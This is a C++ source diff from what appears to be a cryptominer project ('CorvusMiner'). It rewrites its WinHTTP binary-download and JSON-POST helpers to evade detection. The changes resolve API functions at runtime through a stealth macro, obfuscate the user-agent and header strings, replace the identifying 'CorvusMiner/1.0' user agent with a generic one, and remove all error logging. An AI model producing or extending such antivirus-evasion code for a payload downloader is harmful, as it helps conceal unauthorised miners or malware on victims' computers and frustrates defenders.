@@ -49,7 +49,8 @@ std::string fetchJsonFromUrl(const std::wstring& url, int useSSL) {
     std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
     std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
 
-    std::wstring userAgent = std::wstring(OBFUSCATE_STRING("WinHTTP/1.0").begin(), OBFUSCATE_STRING("WinHTTP/1.0").end());
+    std::string _uaNarrow = OBFUSCATE_STRING("WinHTTP/1.0");
+    std::wstring userAgent(_uaNarrow.begin(), _uaNarrow.end());
     HINTERNET hSession = _WinHttpOpen(
         userAgent.c_str(),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
@@ -190,217 +191,139 @@ double GetGPUMinerHashrate() {
 
 // Download binary data from URL
 BYTE* downloadBinaryFromUrl(const std::wstring& url, size_t& outSize, int useSSL) {
+    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCrackUrl");
+    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpen");
+    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpConnect");
+    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpenRequest");
+    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpSendRequest");
+    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReceiveResponse");
+    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpQueryDataAvailable");
+    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReadData");
+    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCloseHandle");
+    if (!_WinHttpCrackUrl || !_WinHttpOpen) { outSize = 0; return nullptr; }
+
     URL_COMPONENTS urlComp = {0};
     urlComp.dwStructSize = sizeof(urlComp);
     urlComp.dwSchemeLength = (DWORD)-1;
     urlComp.dwHostNameLength = (DWORD)-1;
     urlComp.dwUrlPathLength = (DWORD)-1;
 
-    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
-        std::cerr << "[-] Failed to parse URL for binary download." << std::endl;
-        outSize = 0;
-        return nullptr;
+    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
+        outSize = 0; return nullptr;
     }
 
     std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
     std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
 
-    HINTERNET hSession = WinHttpOpen(
-        L"CorvusMiner/1.0", 
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME, 
-        WINHTTP_NO_PROXY_BYPASS, 
-        0
-    );
-    if (!hSession) {
-        std::cerr << "[-] Failed to initialize WinHTTP for binary download." << std::endl;
-        outSize = 0;
-        return nullptr;
+    std::string _uaNarrow2 = OBFUSCATE_STRING("WinHTTP/1.0");
+    std::wstring userAgent(_uaNarrow2.begin(), _uaNarrow2.end());
+    HINTERNET hSession = _WinHttpOpen(userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) { outSize = 0; return nullptr; }
+
+    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
+    if (!hConnect) { _WinHttpCloseHandle(hSession); outSize = 0; return nullptr; }
+
+    DWORD flags = (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"GET",
+        path.empty() ? L"/" : path.c_str(), NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) { _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr; }
+
+    if (!_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
+        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr;
+    }
+    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
+        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr;
     }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
-    if (!hConnect) {
-        WinHttpCloseHandle(hSession);
-        std::cerr << "[-] Failed to connect to host for binary download." << std::endl;
-        outSize = 0;
-        return nullptr;
-    }
-
-    // Determine SSL flag
-    DWORD flags = 0;
-    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
-        flags = WINHTTP_FLAG_SECURE;
-    }
-
-    HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect, 
-        L"GET", 
-        path.empty() ? L"/" : path.c_str(),
-        NULL, 
-        WINHTTP_NO_REFERER, 
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
-        flags
-    );
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "[-] Failed to create HTTP request for binary download." << std::endl;
-        outSize = 0;
-        return nullptr;
-    }
-
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "[-] Failed to send HTTP request for binary download." << std::endl;
-        outSize = 0;
-        return nullptr;
-    }
-
-    if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "[-] Failed to receive HTTP response for binary download." << std::endl;
-        outSize = 0;
-        return nullptr;
-    }
-
-    // Allocate buffer for binary data
     std::vector<BYTE> buffer;
     DWORD dwSize = 0;
-    
     do {
-        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        _WinHttpQueryDataAvailable(hRequest, &dwSize);
         if (!dwSize) break;
-
         BYTE* tempBuffer = new BYTE[dwSize];
         DWORD dwDownloaded = 0;
-        if (WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded)) {
+        if (_WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded))
             buffer.insert(buffer.end(), tempBuffer, tempBuffer + dwDownloaded);
-        }
         delete[] tempBuffer;
     } while (dwSize > 0);
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);
 
-    if (buffer.empty()) {
-        std::cerr << "[-] Downloaded binary data is empty." << std::endl;
-        outSize = 0;
-        return nullptr;
-    }
-
-    // Copy to heap-allocated buffer
+    if (buffer.empty()) { outSize = 0; return nullptr; }
     outSize = buffer.size();
     BYTE* result = new BYTE[outSize];
     memcpy(result, buffer.data(), outSize);
-
     return result;
 }
 
 std::string postJsonToUrl(const std::wstring& url, const std::string& jsonData, int useSSL) {
+    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCrackUrl");
+    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpen");
+    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpConnect");
+    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpenRequest");
+    pWinHttpAddRequestHeaders _WinHttpAddRequestHeaders = (pWinHttpAddRequestHeaders)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpAddRequestHeaders");
+    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpSendRequest");
+    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReceiveResponse");
+    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpQueryDataAvailable");
+    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReadData");
+    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCloseHandle");
+    if (!_WinHttpCrackUrl || !_WinHttpOpen) return "";
+
     URL_COMPONENTS urlComp = {0};
     urlComp.dwStructSize = sizeof(urlComp);
     urlComp.dwSchemeLength = (DWORD)-1;
     urlComp.dwHostNameLength = (DWORD)-1;
     urlComp.dwUrlPathLength = (DWORD)-1;
 
-    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
-        std::cerr << "Failed to parse URL." << std::endl;
-        return "";
-    }
+    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) return "";
 
     std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
     std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
 
-    HINTERNET hSession = WinHttpOpen(
-        L"CorvusMiner/1.0", 
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME, 
-        WINHTTP_NO_PROXY_BYPASS, 
-        0
-    );
-    if (!hSession) {
-        std::cerr << "Failed to initialize WinHTTP." << std::endl;
-        return "";
+    std::string _uaNarrow3 = OBFUSCATE_STRING("WinHTTP/1.0");
+    std::wstring userAgent(_uaNarrow3.begin(), _uaNarrow3.end());
+    HINTERNET hSession = _WinHttpOpen(userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return "";
+
+    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
+    if (!hConnect) { _WinHttpCloseHandle(hSession); return ""; }
+
+    DWORD flags = (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"POST",
+        path.empty() ? L"/" : path.c_str(), NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) { _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return ""; }
+
+    std::string _ctNarrow = OBFUSCATE_STRING("Content-Type: application/json");
+    std::wstring contentType(_ctNarrow.begin(), _ctNarrow.end());
+    if (_WinHttpAddRequestHeaders && !_WinHttpAddRequestHeaders(hRequest, contentType.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) {
+        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
     }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
-    if (!hConnect) {
-        WinHttpCloseHandle(hSession);
-        std::cerr << "Failed to connect to host." << std::endl;
-        return "";
+    if (!_WinHttpSendRequest(hRequest, NULL, 0, (void*)jsonData.c_str(), (DWORD)jsonData.length(), (DWORD)jsonData.length(), 0)) {
+        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
     }
-
-    // Determine SSL flag: use useSSL parameter if provided (1), otherwise check URL scheme
-    DWORD flags = 0;
-    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
-        flags = WINHTTP_FLAG_SECURE;
-    }
-
-    HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect, 
-        L"POST", 
-        path.empty() ? L"/" : path.c_str(),
-        NULL, 
-        WINHTTP_NO_REFERER, 
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
-        flags
-    );
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "Failed to create HTTP request." << std::endl;
-        return "";
-    }
-
-    // Set Content-Type header
-    std::wstring contentType = L"Content-Type: application/json";
-    if (!WinHttpAddRequestHeaders(hRequest, contentType.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "Failed to add request headers." << std::endl;
-        return "";
-    }
-
-    if (!WinHttpSendRequest(hRequest, NULL, 0, (void*)jsonData.c_str(), (DWORD)jsonData.length(), (DWORD)jsonData.length(), 0)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "Failed to send HTTP request." << std::endl;
-        return "";
-    }
-
-    if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        std::cerr << "Failed to receive HTTP response." << std::endl;
-        return "";
+    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
+        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
     }
 
     std::string response;
     DWORD dwSize = 0;
     do {
-        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        _WinHttpQueryDataAvailable(hRequest, &dwSize);
         if (!dwSize) break;
-
         char* buffer = new char[dwSize + 1];
         DWORD dwDownloaded = 0;
-        if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
+        if (_WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
             buffer[dwDownloaded] = '\0';
             response += buffer;
         }
         delete[] buffer;
     } while (dwSize > 0);
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-
+    _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);
     return response;
 }
